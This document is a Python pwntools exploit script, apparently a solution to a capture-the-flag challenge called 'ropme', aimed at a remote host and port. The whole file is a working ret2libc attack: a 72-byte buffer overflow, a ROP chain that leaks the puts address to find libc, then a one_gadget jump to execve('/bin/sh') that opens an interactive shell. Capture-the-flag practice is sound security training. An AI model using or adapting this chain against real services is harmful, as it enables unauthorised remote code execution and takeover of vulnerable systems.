#!/usr/bin/env python3
from pwn import *

e = context.binary = ELF('./ropme', checksec=False)
libc = ELF('./libc.so', checksec=False)
#io = process(e.path)
io = remote('138.68.182.108',30467)

#context.log_level = "DEBUG"

# Gadgets
pop_rdi = 0x00000000004006d3
got_puts = e.got['puts']
plt_puts = e.plt['puts']
main = e.sym['main']

# Junk

junk = 72*b'A'

io.recvuntil("ROP me outside, how 'about dah?\n")

# Leak Libc address
payload = junk
payload += p64(pop_rdi)
payload += p64(got_puts)
payload += p64(plt_puts)
payload += p64(main)

io.sendline(payload)
leak = io.recvline().strip()
leak = u64(leak.ljust(8, b'\x00'))
log.success('Puts address found at ' + hex(leak))

libc_base = libc.address = leak - 0x06f690
log.success('Libc address found at ' + hex(libc_base))

# Final ROP

system = libc_base + 0x045390 # system()
bin_sh = libc_base + 0x18cd57 - 64 # /bin/sh

one_gadget = libc_base + 0x45216 #execve("/bin/sh", rsp+0x30, environ)

payload = junk
#payload += p64(pop_rdi)
#payload += p64(bin_sh)
#payload += p64(system)
payload += p64(one_gadget)

io.recvuntil("ROP me outside, how 'about dah?\n")
io.sendline(payload)
io.interactive()
